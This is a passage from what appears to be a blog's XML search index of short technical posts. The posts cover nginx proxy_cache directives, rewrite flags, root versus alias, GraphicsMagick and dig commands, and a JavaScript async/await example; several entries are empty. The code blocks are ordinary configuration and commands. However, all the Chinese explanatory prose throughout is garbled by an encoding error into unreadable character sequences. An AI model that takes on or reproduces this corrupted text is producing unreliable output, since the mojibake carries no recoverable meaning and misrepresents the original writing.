æŒ‡å®šäº†é¡¹ç›®åœ¨ä¸è¢«è®¿é—®çš„æƒ…å†µä¸‹èƒ½å¤Ÿåœ¨å†…å­˜ä¸­ä¿æŒçš„æ—¶é—´ã€‚åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œå¦‚æœä¸€ä¸ªæ–‡ä»¶åœ¨7å¤©ä¹‹å†…æ²¡æœ‰è¢«è¯·æ±‚ï¼Œåˆ™ç¼“å­˜ç®¡ç†å°†ä¼šè‡ªåŠ¨å°†å…¶åœ¨å†…å­˜ä¸­åˆ é™¤ï¼Œä¸ç®¡è¯¥æ–‡ä»¶æ˜¯å¦è¿‡æœŸã€‚è¯¥å‚æ•°é»˜è®¤å€¼ä¸º10åˆ†é’Ÿï¼ˆ10mï¼‰ã€‚æ³¨æ„ï¼Œéæ´»åŠ¨å†…å®¹æœ‰åˆ«äºè¿‡æœŸå†…å®¹ã€‚NGINXä¸ä¼šè‡ªåŠ¨åˆ é™¤ç”±ç¼“å­˜æ§åˆ¶å¤´éƒ¨æŒ‡å®šçš„è¿‡æœŸå†…å®¹ï¼ˆæœ¬ä¾‹ä¸­Cache-Control:max-age&#x3D;120ï¼‰ã€‚è¿‡æœŸå†…å®¹åªæœ‰åœ¨<code>inactive</code>æŒ‡å®šæ—¶é—´å†…æ²¡æœ‰è¢«è®¿é—®çš„æƒ…å†µä¸‹æ‰ä¼šè¢«åˆ é™¤ã€‚å¦‚æœè¿‡æœŸå†…å®¹è¢«è®¿é—®äº†ï¼Œé‚£ä¹ˆNGINXå°±ä¼šå°†å…¶ä»åŸæœåŠ¡å™¨ä¸Šåˆ·æ–°ï¼Œå¹¶æ›´æ–°å¯¹åº”çš„<code>inactive</code>è®¡æ—¶å™¨ã€‚</td></tr></tbody></table><h3 id="proxy-cache"><a href="#proxy-cache" class="headerlink" title="proxy_cache"></a>proxy_cache</h3><blockquote><p>é…ç½®åœ¨locationä¸­ï¼Œç”¨æ¥å¯ç”¨ç¼“å­˜<br><code>proxy_cache</code>çš„å€¼æ˜¯ä¸Šé¢proxy_cache_pathé…ç½®ä¸­<code>keys_zone</code>ç¼“å­˜çš„åå­—ã€‚</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    ...</span><br><span class="line">    proxy_cache my_cache;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="proxy-cache-methods"><a href="#proxy-cache-methods" class="headerlink" title="proxy_cache_methods"></a>proxy_cache_methods</h3><p>è¯¥æŒ‡ä»¤ç”¨äºè®¾ç½®ç¼“å­˜å“ªäº›HTTPæ–¹æ³•ï¼Œé»˜è®¤ç¼“å­˜HTTP GET&#x2F;HEADæ–¹æ³•ï¼Œä¸ç¼“å­˜HTTP POSTæ–¹æ³•ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    ...</span><br><span class="line">    proxy_cache_methods GET HEAD;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="proxy-cache-min-uses"><a href="#proxy-cache-min-uses" class="headerlink" title="proxy_cache_min_uses"></a>proxy_cache_min_uses</h3><p>æ˜¯æŒ‡åŒä¸€ä¸ªurlï¼Œä¸ç®¡æ—¶é—´é—´éš”å¤šé•¿ï¼Œæ˜¯å¦åœ¨ä¸€ä¸ªç¼“å­˜å‘¨æœŸå¤–ï¼Œåªè¦æ€»æ¬¡æ•°åˆ°è¾¾<code>proxy_cache_min_uses</code>æ¬¡æ•°ï¼Œå°±ä¼šè§¦å‘ç¼“å­˜åŠŸèƒ½ã€‚åç»­ç¼“å­˜å¤±æ•ˆä»¥åï¼Œåªè¦è®¿é—®ä¸€æ¬¡ï¼Œåˆä¼šç¼“å­˜ã€‚<code>proxy_cache_min_uses</code>é»˜è®¤å€¼æ˜¯<code>1</code>ï¼Œå½“ç¼“å­˜ä¸æ–­è¢«å¡«æ»¡æ—¶ï¼Œè¿™é¡¹è®¾ç½®ä¾¿ååˆ†æœ‰ç”¨ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    ...</span><br><span class="line">    proxy_cache_min_uses 3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="proxy-cache-use-stale"><a href="#proxy-cache-use-stale" class="headerlink" title="proxy_cache_use_stale"></a>proxy_cache_use_stale</h3><p>å½“æ— æ³•ä»åŸå§‹æœåŠ¡å™¨è·å–æœ€æ–°çš„å†…å®¹æ—¶ï¼ŒNGINXå¯ä»¥åˆ†å‘ç¼“å­˜ä¸­çš„é™ˆæ—§å†…å®¹ã€‚è¿™ç§æƒ…å†µä¸€èˆ¬å‘ç”Ÿåœ¨å…³è”ç¼“å­˜å†…å®¹çš„åŸå§‹æœåŠ¡å™¨å®•æœºæˆ–è€…ç¹å¿™æ—¶ã€‚æ¯”èµ·å¯¹å®¢æˆ·ç«¯ä¼ è¾¾é”™è¯¯ä¿¡æ¯ï¼ŒNGINXå¯å‘é€åœ¨å…¶å†…å­˜ä¸­çš„é™ˆæ—§çš„æ–‡ä»¶ã€‚NGINXçš„è¿™ç§ä»£ç†æ–¹å¼ï¼Œä¸ºæœåŠ¡å™¨æä¾›é¢å¤–çº§åˆ«çš„å®¹é”™èƒ½åŠ›ï¼Œå¹¶ç¡®ä¿äº†åœ¨æœåŠ¡å™¨æ•…éšœæˆ–æµé‡å³°å€¼çš„æƒ…å†µä¸‹çš„æ­£å¸¸è¿è¡Œã€‚</p><p><code>proxy_cache_use_stale</code>è¿˜æœ‰ä¸ªå–å€¼<code>updating</code>ï¼Œå®ƒçš„æ„æ€åœ¨ç¼“å­˜è¿‡æœŸæ—¶å½“ç¬¬ä¸€ä¸ªè¯·æ±‚æ­£åœ¨è·å–æ–°èµ„æºçš„æ—¶å€™å¦‚æœæœ‰å…¶å®ƒè¯·æ±‚è¿‡æ¥ï¼Œé‚£ä¹ˆç°åœ¨å…ˆç»™å®ƒä»¬æ—§çš„èµ„æºã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    ...</span><br><span class="line">    proxy_cache_use_stale error timeout http_500 http_502 http_503 http_504;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="proxy-cache-lock"><a href="#proxy-cache-lock" class="headerlink" title="proxy_cache_lock"></a>proxy_cache_lock</h3><p>å½“<code>proxy_cache_lock</code>è¢«å¯ç”¨æ—¶ï¼Œå½“å¤šä¸ªå®¢æˆ·ç«¯è¯·æ±‚ä¸€ä¸ªç¼“å­˜ä¸­ä¸å­˜åœ¨çš„æ–‡ä»¶ï¼ˆæˆ–ç§°ä¹‹ä¸ºä¸€ä¸ª<code>MISS</code>ï¼‰ï¼Œåªæœ‰è¿™äº›è¯·æ±‚ä¸­çš„ç¬¬ä¸€ä¸ªè¢«å…è®¸å‘é€è‡³æœåŠ¡å™¨ã€‚å…¶ä»–è¯·æ±‚åœ¨ç¬¬ä¸€ä¸ªè¯·æ±‚å¾—åˆ°æ»¡æ„ç»“æœä¹‹ååœ¨ç¼“å­˜ä¸­å¾—åˆ°æ–‡ä»¶ã€‚å¦‚æœä¸å¯ç”¨<code>proxy_cache_lock</code>ï¼Œåˆ™æ‰€æœ‰åœ¨ç¼“å­˜ä¸­æ‰¾ä¸åˆ°æ–‡ä»¶çš„è¯·æ±‚éƒ½ä¼šç›´æ¥ä¸æœåŠ¡å™¨é€šä¿¡ã€‚</p><p>è¿™å’Œ<code>proxy_cache_use_stale</code>å–<code>updating</code>ä¸å¤ªä¸€æ ·ï¼Œ<code>proxy_cache_use_stale</code>å–<code>updating</code>æ—¶åç»­çš„è¯·æ±‚ä¸ä¼šç­‰å¾…ï¼Œè€Œæ˜¯ç›´æ¥å…ˆä½¿ç”¨è¿‡æœŸçš„èµ„æºã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    ...</span><br><span class="line">    proxy_cache_lock on;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="proxy-cache-revalidate"><a href="#proxy-cache-revalidate" class="headerlink" title="proxy_cache_revalidate"></a>proxy_cache_revalidate</h3><p>ç¼“å­˜å†éªŒè¯ï¼Œä½¿ç”¨HTTPçš„304æœºåˆ¶ã€‚æ–‡ä»¶è¿‡æœŸä¸ä»£è¡¨æ–‡ä»¶çœŸçš„æœ‰å˜åŒ–ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    ...</span><br><span class="line">    proxy_cache_revalidate on;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="proxy-cache-valid"><a href="#proxy-cache-valid" class="headerlink" title="proxy_cache_valid"></a>proxy_cache_valid</h3><p>è¯¥æŒ‡ä»¤ç”¨äºå¯¹ä¸åŒè¿”å›çŠ¶æ€ç çš„URLè®¾ç½®ä¸åŒçš„ç¼“å­˜æ—¶é—´ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    ...</span><br><span class="line">    proxy_cache_valid 200 302 10m;</span><br><span class="line">    proxy_cache_valid 301 1h;</span><br><span class="line">    proxy_cache_valid any 1m;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="proxy-ignore-headers"><a href="#proxy-ignore-headers" class="headerlink" title="proxy_ignore_headers"></a>proxy_ignore_headers</h3><p>å¯¹äºæºç«™è€Œè¨€ï¼ŒNginxä¹Ÿå°±æ˜¯ä¸€ä¸ªå¤§çš„æµè§ˆå™¨ï¼Œæºç«™å‘Šè¯‰Nginxçš„Expires&#x2F;Cache-ControlæŒ‡å®šäº†max-ageå€¼ï¼ŒæŒ‰ç…§è§„åˆ™æ˜¯è½®ä¸åˆ°proxy_cache_validçš„ã€‚é‚£ä¹ˆå¦‚æœä¸€å®šè¦æ ¹æ®Nginxç¼“å­˜æ—¶é—´ä¸ºå‡†æ€ä¹ˆåŠå‘¢ï¼Ÿé‚£å°±æ˜¯å¿½ç•¥æºç«™çš„Expires&#x2F;Cache-Controlæ§åˆ¶ã€‚</p><p>location &#x2F; {<br>    â€¦<br>    proxy_ignore_headers Cache-Control;<br>    proxy_ignore_headers Expires;<br>}</p><h3 id="ngx-cache-purge"><a href="#ngx-cache-purge" class="headerlink" title="ngx_cache_purge"></a>ngx_cache_purge</h3><p>å¦‚æœè¦æƒ³æ›´çµæ´»ç‚¹ï¼Œæˆ‘ä»¬å¯èƒ½è¿˜éœ€è¦æ¸…ç†ç¼“å­˜åŠŸèƒ½ã€‚é»˜è®¤Nginxç¼“å­˜æ¨¡å—æ²¡æä¾›è¿™ä¸ªåŠŸèƒ½ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ä¸€ä¸ªç¬¬ä¸‰æ–¹çš„æ¨¡å—æ¥å®ç°<a href="https://github.com/FRiCKLE/ngx_cache_purge">ngx_cache_purge</a></p><h3 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">    ...</span><br><span class="line">    proxy_cache_path /usr/local/openresty/nginx/proxy_cache/ levels=1:2 keys_zone=my_cache:5m max_size=1g inactive=7d;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location / &#123;</span><br><span class="line">    ...</span><br><span class="line">    proxy_cache my_cache;</span><br><span class="line">    proxy_cache_revalidate on;</span><br><span class="line">    proxy_cache_use_stale error timeout http_500 http_502 http_503 http_504;</span><br><span class="line">    proxy_cache_lock on;</span><br><span class="line">    proxy_cache_valid any 1d; # åœ¨æºç«™æ²¡æœ‰è®¾ç½®ç¼“å­˜æ—¶é—´æ—¶ç”Ÿæ•ˆ</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="http://www.jfh.com/jfperiodical/article/949">NGINXç¼“å­˜ä½¿ç”¨å®˜æ–¹æŒ‡å—</a></li><li>å®æˆ˜Nginxï¼šå–ä»£Apacheçš„é«˜æ€§èƒ½WebæœåŠ¡å™¨ï¼ˆç¬¬ä¹ç« ï¼‰</li><li><a href="http://www.firefoxbug.com/index.php/archives/2089/">Nginxç¼“å­˜è¯¦ç»†é…ç½®</a></li><li><a href="http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_ignore_headers">http://nginx.org/en/docs/http/ngx_http_proxy_module.html?#proxy_ignore_headers</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> cache </tag>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€è‡´æ€§Hash</title>
      <link href="/post/consistent-hashing.html"/>
      <url>/post/consistent-hashing.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/QQ20171023-161427@2x.jpg"><br><img src="/images/QQ20171023-161458@2x.jpg"></p>]]></content>
      
      
      
        <tags>
            
            <tag> hash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gm</title>
      <link href="/post/gm.html"/>
      <url>/post/gm.html</url>
      
        <content type="html"><![CDATA[<p>gm convert myImage.png +dither -depth 8 -colors 50 myImage.png</p><p>gm identify -format â€œfile_size:%b,unique_colors:%k,bit_depth:%qâ€ myImage.png</p><p>gm convert -strip -interlace Plane -gaussian-blur 0.05 -quality 85% source.jpg result.jpg</p><p><a href="https://stackoverflow.com/questions/4228027/what-options-for-convert-imagemagick-or-graphicsmagick-produce-the-smallest-f">https://stackoverflow.com/questions/4228027/what-options-for-convert-imagemagick-or-graphicsmagick-produce-the-smallest-f</a></p><p><a href="http://www.iitshare.com/the-graphicsmagick-installation-and-use.html">http://www.iitshare.com/the-graphicsmagick-installation-and-use.html</a></p><p><a href="https://my.oschina.net/pangzhuzhu/blog/317925">https://my.oschina.net/pangzhuzhu/blog/317925</a></p><p><a href="http://www.cnblogs.com/zhoujingjie/p/4917461.html">http://www.cnblogs.com/zhoujingjie/p/4917461.html</a></p><p><a href="https://stackoverflow.com/questions/25372402/graphicsmagick-processes-resulting-in-empty-file">https://stackoverflow.com/questions/25372402/graphicsmagick-processes-resulting-in-empty-file</a></p><p><a href="https://stackoverflow.com/questions/6605006/convert-pdf-to-image-with-high-resolution">https://stackoverflow.com/questions/6605006/convert-pdf-to-image-with-high-resolution</a></p><p><a href="https://stackoverflow.com/questions/2257322/reducing-the-file-size-of-a-very-large-images-without-changing-the-image-dimens">https://stackoverflow.com/questions/2257322/reducing-the-file-size-of-a-very-large-images-without-changing-the-image-dimens</a>cd GraphicsMagic</p>]]></content>
      
      
      
        <tags>
            
            <tag> gm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nginx-rewrite</title>
      <link href="/post/nginx-rewrite.html"/>
      <url>/post/nginx-rewrite.html</url>
      
        <content type="html"><![CDATA[<h3 id="rewriteæŒ‡ä»¤"><a href="#rewriteæŒ‡ä»¤" class="headerlink" title="rewriteæŒ‡ä»¤"></a>rewriteæŒ‡ä»¤</h3><p>ä½¿ç”¨rewriteæŒ‡ä»¤æˆ‘ä»¬å¯ä»¥æ”¹å†™URLï¼Œå®ç°å¤–éƒ¨å’Œå†…éƒ¨é‡å®šå‘ã€‚</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>è¯­æ³•</td><td>rewrite regex replacement flag</td></tr><tr><td>é»˜è®¤å€¼</td><td>none</td></tr><tr><td>ä½¿ç”¨ç¯å¢ƒ</td><td>server, location, if</td></tr></tbody></table><h4 id="regex"><a href="#regex" class="headerlink" title="regex"></a>regex</h4><p>æ­£åˆ™åŒ¹é…è§„åˆ™ï¼ŒNginxæ­£åˆ™é‡‡ç”¨PCREæ­£åˆ™è¡¨è¾¾å¼è¯­æ³•ï¼Œå’ŒJavaã€JavaScriptç­‰è¯­è¨€ä¸€æ ·ã€‚</p><h4 id="replacement"><a href="#replacement" class="headerlink" title="replacement"></a>replacement</h4><p>è¿™ä¸ªéƒ¨åˆ†å¯ä»¥ä½¿ç”¨å­—ç¬¦ä¸²ã€Nginxå˜é‡ã€ä»¥åŠæ­£åˆ™åŒ¹é…åˆ°çš„å…ƒç»„ï¼ˆä»<code>$1</code>åˆ°<code>$9</code>ï¼‰</p><h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><p>flag ä¸€å…±å››ç§ï¼Œç”¨æ¥è¯´æ˜åŒ¹é…åˆ°åå†…éƒ¨å¦‚ä½•å¤„ç†ã€‚</p><table><thead><tr><th>flag</th><th>è§£é‡Š</th></tr></thead><tbody><tr><td>permanent</td><td>301 æ°¸ä¹…é‡å®šå‘</td></tr><tr><td>redirect</td><td>302 ä¸´æ—¶é‡å®šå‘</td></tr><tr><td>last</td><td>å†…éƒ¨é‡å®šå‘ï¼Œä¼šåœ¨å†…éƒ¨é‡æ–°å‘èµ·è¯·æ±‚ã€‚</td></tr><tr><td>break</td><td>ä¸ä¼šåƒlastä¸€æ ·é‡æ–°å‘èµ·è¯·æ±‚ï¼Œç»ˆæ­¢åŒ¹é…ã€‚ç›´æ¥ä½¿ç”¨æ–°URLåœ¨å½“å‰locationä¸­è¯·æ±‚ã€‚</td></tr></tbody></table><h4 id="last-ä¸-break"><a href="#last-ä¸-break" class="headerlink" title="last ä¸ break"></a>last ä¸ break</h4><p>lastæ ‡è®°åœ¨æœ¬æ¡rewriteè§„åˆ™æ‰§è¡Œå®Œæ¯•åï¼Œä¼šå¯¹å…¶æ‰€åœ¨çš„<code>server{...}</code>æ ‡ç­¾é‡æ–°å‘èµ·è¯·æ±‚ï¼Œè€Œ<code>break</code>æ ‡è®°åˆ™åœ¨æœ¬æ¡è§„åˆ™åŒ¹é…å®Œæˆåï¼Œç»ˆæ­¢åŒ¹é…ï¼Œä¸å†åŒ¹é…åé¢çš„è§„åˆ™ã€‚<br>ä½¿ç”¨<code>alias</code>æŒ‡ä»¤æ—¶å¿…é¡»ç”¨<code>last</code>æ ‡è®°ï¼Œä½¿ç”¨<code>proxy_pass</code>æŒ‡ä»¤æ—¶è¦ä½¿ç”¨<code>break</code>æ ‡è®°ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>viewport</title>
      <link href="/post/viewport.html"/>
      <url>/post/viewport.html</url>
      
        <content type="html"><![CDATA[<p><a href="http://www.cnblogs.com/2050/p/3877280.html">ç§»åŠ¨å‰ç«¯å¼€å‘ä¹‹viewportçš„æ·±å…¥ç†è§£</a></p><p>å…³é”®è¯ï¼šlayout viewportã€visual viewportã€ideal viewport</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>nginx-root-alias</title>
      <link href="/post/nginx-root-alias.html"/>
      <url>/post/nginx-root-alias.html</url>
      
        <content type="html"><![CDATA[<h3 id="nginx-root-alias"><a href="#nginx-root-alias" class="headerlink" title="nginx root &amp; alias"></a>nginx root &amp; alias</h3><p><code>root</code>æ˜¯æŒ‡å®šä¸€ä¸ªé¡¹ç›®æ ¹ç›®å½•ï¼Œ<code>alias</code>è¡¨ç¤ºä¸€ä¸ªæ‹¼æ¥çš„æ„æ€ã€‚</p><p>ä¾‹å¦‚æˆ‘ä»¬è¯·æ±‚è·¯å¾„ä¸º<code>https://www.domain.com/images/logo.png</code></p><p><strong>root</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location ^~ /images/ &#123;</span><br><span class="line">    root /var/www;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®é™…æ˜ å°„è·¯å¾„æ˜¯ <code>/var/www/images/logo.png</code></p><p><strong>alias</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location ^~ /images/ &#123;</span><br><span class="line">    alias /var/www/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®é™…æ˜ å°„è·¯å¾„æ˜¯ <code>/var/www/logo.png</code></p><blockquote><p>æ³¨æ„ï¼š<code>alias</code>çš„åé¢å¦‚æœæŒ‡å®šçš„æ˜¯ä¸€ä¸ªæ–‡ä»¶å¤¹æ–œæ ä¸èƒ½çœç•¥ã€‚<code>alias</code>çš„æœ€ç»ˆå¤„ç†æ˜¯æ‹¼æ¥çš„è¿‡ç¨‹ã€‚</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dig</title>
      <link href="/post/dig.html"/>
      <url>/post/dig.html</url>
      
        <content type="html"><![CDATA[<h2 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h2><p>digå‘½ä»¤æ˜¯å¸¸ç”¨çš„åŸŸåæŸ¥è¯¢å·¥å…·ï¼Œå¯ä»¥ç”¨æ¥æµ‹è¯•åŸŸåç³»ç»Ÿå·¥ä½œæ˜¯å¦æ­£å¸¸ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install bind-utils</span><br></pre></td></tr></table></figure><h3 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><p>dig @DNS_SERVER DOMAIN_NAME [ANY|ANY|A|MX|SIG]</p><ul><li><p>æŸ¥è¯¢åŸŸåçš„Aåœ°å€</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @8.8.8.8 www.baidu.com A</span><br></pre></td></tr></table></figure></li><li><p>æŸ¥è¯¢åŸŸåçš„CNAME </p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @8.8.8.8 www.baidu.com CNAME</span><br></pre></td></tr></table></figure></li></ul><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li><a href="http://blog.csdn.net/reyleon/article/details/12976889">ä½¿ç”¨digå‘½ä»¤è§£æåŸŸå</a></li><li><a href="http://www.cnblogs.com/daxian2012/archive/2013/01/10/2854126.html">digå‘½ä»¤ä½¿ç”¨å¤§å…¨</a></li><li><a href="http://man.linuxde.net/dig">digå‘½ä»¤</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> dns </tag>
            
            <tag> dig </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>async/await</title>
      <link href="/post/async-await.html"/>
      <url>/post/async-await.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// async function like a auto-execute generator function. Juse like co.</span></span><br><span class="line"><span class="comment">// co + generator yield similar with async/await</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f1</span>(<span class="params">ret</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span> (<span class="params">resolve, reject</span>) &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (ret) <span class="title function_">resolve</span>(ret)</span><br><span class="line">            <span class="keyword">else</span> <span class="title function_">reject</span>(<span class="string">&#x27;err&#x27;</span>);</span><br><span class="line">        &#125;, <span class="number">1000</span>)</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// async function return a promise;</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">f2</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// you can use Promise.all to parallel execute function.</span></span><br><span class="line">    <span class="keyword">let</span> rets = <span class="keyword">await</span> <span class="title class_">Promise</span>.<span class="title function_">all</span>([<span class="title function_">f1</span>(<span class="string">&#x27;f1_1&#x27;</span>), <span class="title function_">f1</span>(<span class="string">&#x27;f1_2&#x27;</span>)]);</span><br><span class="line">    <span class="comment">// throw new Error(&#x27;abc&#x27;);</span></span><br><span class="line">    <span class="keyword">return</span> rets;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// you can use catch function to catch async function error.</span></span><br><span class="line"><span class="comment">// also you can use try-catch to catch error in async function inner. </span></span><br><span class="line"><span class="title function_">f2</span>()</span><br><span class="line">    .<span class="title function_">then</span>(<span class="variable language_">console</span>.<span class="property">log</span>)</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="variable language_">console</span>.<span class="property">error</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// -----------------------</span></span><br><span class="line"><span class="comment">// similar code </span></span><br><span class="line"><span class="title function_">co</span>(<span class="keyword">function</span>* () &#123;</span><br><span class="line">    <span class="keyword">let</span> rets = <span class="keyword">yield</span> <span class="title class_">Promise</span>.<span class="title function_">all</span>([<span class="title function_">f1</span>(<span class="string">&#x27;f1_1&#x27;</span>), <span class="title function_">f1</span>(<span class="string">&#x27;f1_2&#x27;</span>)]);</span><br><span class="line">    <span class="keyword">return</span> rets;</span><br><span class="line">&#125;)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="variable language_">console</span>.<span class="property">log</span>)</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="variable language_">console</span>.<span class="property">error</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> nodejs </tag>
            
            <tag> async </tag>
            
            <tag> await </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nc</title>
      <link href="/post/nc.html"/>
      <url>/post/nc.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>forever</title>
      <link href="/post/forever.html"/>
      <url>/post/forever.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
        <tags>
            
            <tag> forever </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP2</title>
      <link href="/post/http2.html"/>
      <url>/post/http2.html</url>
      
